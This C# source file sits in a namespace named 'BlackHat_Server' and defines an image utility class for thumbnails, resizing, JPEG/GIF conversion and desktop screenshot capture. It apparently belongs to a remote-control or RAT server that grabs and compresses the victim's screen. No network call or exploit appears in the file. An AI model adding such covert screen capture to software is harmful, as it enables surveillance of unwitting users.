using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.IO;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace BlackHat_Server
{
    class ImageWorker
    {
        /// <summary>
        /// Passo un file immagine e torno un'immagine thumb
        /// </summary>
        /// <param name="par_FileImage"></param>
        /// <param name="height"></param>
        /// <param name="width"></param>
        /// <returns></returns>
        public Image GetThumbNail(string par_FileImage, int height, int width)
        {
            try
            {
                Image image = Image.FromFile(par_FileImage);
                Image imageThumb = image.GetThumbnailImage(width, height, null, new IntPtr());

                return imageThumb;
            }
            catch 
            {
                return null;
            }
            
        }


        /// <summary>
        /// Image top Byte Array
        /// </summary>
        /// <param name="imageIn"></param>
        /// <returns></returns>
        public byte[] imageToByteArray(System.Drawing.Image imageIn)
        {
            MemoryStream ms = new MemoryStream();

            imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Gif);

            byte[] res = ms.ToArray();

            ms.Dispose();

            return res;



        }


        /// <summary>
        /// Resize Image Con Mantenimento Proporzioni
        /// </summary>
        /// <param name="imgToResize"></param>
        /// <param name="size"></param>
        /// <returns></returns>
        public Image resizeImage(Image imgToResize, Size size)
        {
            int sourceWidth = imgToResize.Width;
            int sourceHeight = imgToResize.Height;

            float nPercent = 0;
            float nPercentW = 0;
            float nPercentH = 0;

            nPercentW = ((float)size.Width / (float)sourceWidth);
            nPercentH = ((float)size.Height / (float)sourceHeight);

            if (nPercentH < nPercentW)
                nPercent = nPercentH;
            else
                nPercent = nPercentW;

            int destWidth = (int)(sourceWidth * nPercent);
            int destHeight = (int)(sourceHeight * nPercent);

            Bitmap b = new Bitmap(destWidth, destHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.InterpolationMode = InterpolationMode.HighQualityBicubic;

            g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);
           
            g.Dispose();


            return (Image)b;
        }


     


        /// <summary>
        /// Desktop Resizzato
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        public byte[] DesktopImage(int width, int height, int qual)
        {
            ScreenCapture sc = new ScreenCapture();

            Image dk = sc.ScreenShot();
            Image dkResized = null;

            if (dk != null)
            {

                Size sz = new Size(width, height);

                dkResized = resizeImage(dk, sz);

                byte[] res = ImgToJpg(dkResized, qual);


                dk.Dispose();
                dkResized.Dispose();

                return res;
            }
            else
            {
                if (dk != null)
                    dk.Dispose();

                if (dkResized != null)
                    dkResized.Dispose();

                return null;
            }


        }




        /// <summary>
        /// Resize di un Image e trasformazione in jpg
        /// NULL in caso di errore
        /// </summary>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        public byte[] ImageResizeToJpg(Image immagine ,int width, int height, int qual)
        {
            try
            {
                Image imResized = null;

                if (immagine != null)
                {

                    Size sz = new Size(width, height);

                    imResized = resizeImage(immagine, sz);

                    byte[] res = ImgToJpg(imResized, qual);


                    immagine.Dispose();
                    imResized.Dispose();

                    return res;
                }
                else
                {
                    if (immagine != null)
                        immagine.Dispose();

                    if (imResized != null)
                        imResized.Dispose();

                    return null;
                }
            }
            catch 
            {

                return null;
            }        
           


        }
        //----------------------------------------------------------





        /// <summary>
        /// Da Img a jpg
        /// </summary>
        /// <param name="originalImage"></param>
        /// <param name="quality"></param>
        /// <returns></returns>
        public byte[] ImgToJpg(Image originalImage, long quality)
        {
            MemoryStream ms = new MemoryStream();
            
            // Encoder parameter for image quality
            EncoderParameter qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

            // Jpeg image codec
            ImageCodecInfo jpegCodec = this.getEncoderInfo("image/jpeg");
            if (jpegCodec == null)
                return null;

            EncoderParameters encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = qualityParam;

            originalImage.Save(ms, jpegCodec, encoderParams);

            return ms.ToArray();
        }

        private ImageCodecInfo getEncoderInfo(string mimeType)
        {
            // Get image codecs for all image formats
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            // Find the correct image codec
            for (int i = 0; i < codecs.Length; i++)
                if (codecs[i].MimeType == mimeType)
                    return codecs[i];
            return null;
        }

     








    }
}
